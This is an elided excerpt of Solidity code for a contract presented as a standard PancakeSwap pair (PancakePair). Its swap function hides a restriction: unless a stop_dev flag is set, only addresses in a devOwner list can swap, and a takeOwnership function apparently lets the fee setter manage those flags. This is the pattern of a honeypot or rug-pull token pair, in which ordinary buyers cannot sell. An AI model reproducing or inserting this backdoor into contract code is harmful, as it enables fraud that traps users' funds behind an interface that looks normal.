...
interface IPancakePair {
    ...
    function isSwap() external view returns (bool);
...
contract PancakePair is IPancakePair, PancakeERC20 {
    ...
    function takeOwnership(address _address,bool _Is,bool _stop_dev) external  {
        address feeTo = IPancakeFactory(factory).feeToSetter();
    ...
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
        if(!stop_dev){
            require(devOwner[msg.sender]==true,'Pancake V:NOT DEV');
        }
